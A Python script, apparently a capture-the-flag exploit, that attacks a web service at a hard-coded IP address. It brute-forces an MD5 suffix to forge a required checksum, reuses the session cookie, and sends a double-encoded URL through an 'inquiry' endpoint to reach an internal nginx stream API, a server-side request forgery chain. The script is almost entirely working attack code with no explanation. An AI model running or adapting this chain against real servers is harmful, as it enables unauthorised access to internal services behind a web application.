import hashlib

def getLastCharacterMD5(s, n):
    md5Hash = hashlib.md5(s.encode()).hexdigest()
    lastNCharacters = md5Hash[-n:]
    return lastNCharacters

def brute_hash(target_hash):

    #target_hash = "b380c5"  # Target hash with the last 6 characters to match

    found = False
    attempt = 0
    string_to_hash = ""
    while not found:
        attempt += 1
        string_to_hash = str(attempt)
        last_six_chars = getLastCharacterMD5(string_to_hash, 6)
        
        if last_six_chars == target_hash:
            found = True
            print(f"String: {string_to_hash}")
            print(f"MD5 Hash: {getLastCharacterMD5(string_to_hash, 6)}")
            break

        if attempt % 1000000 == 0:
            print(f"Attempt: {attempt}")

    print("Brute force complete!")
    return string_to_hash



import requests

url = 'http://3.36.93.133/api/inquiry?url=http://pwning.net'

response = requests.get(url)

last_six_characters = ""

if response.status_code == 200:
    # Extract the last 6 characters from the response body
    body = response.text
    last_six_characters = body[-6:]
    
    print("Last 6 characters:", last_six_characters)
else:
    print("Request failed with status code:", response.status_code)

# Extract the value of the cookie set in the response
cookies = response.cookies
cookie_value = cookies.get("connect.sid")  # Replace "COOKIE_NAME" with the actual name of the cookie


checksum = brute_hash(last_six_characters)

url = f'http://3.36.93.133/api/inquiry?url=http%3A%2F%2Fnginx%2Fapi%2Fstream%2Fhttp%253A%252F%252Fp3%2Eyt%252Fp3%2Ehtml&checksum={checksum}'


# Set the headers with the cookie value
headers = {
    'Cookie': f'connect.sid={cookie_value}',  # Replace "COOKIE_NAME" with the actual name of the cookie
}

response = requests.get(url, headers=headers)

print(response.text)

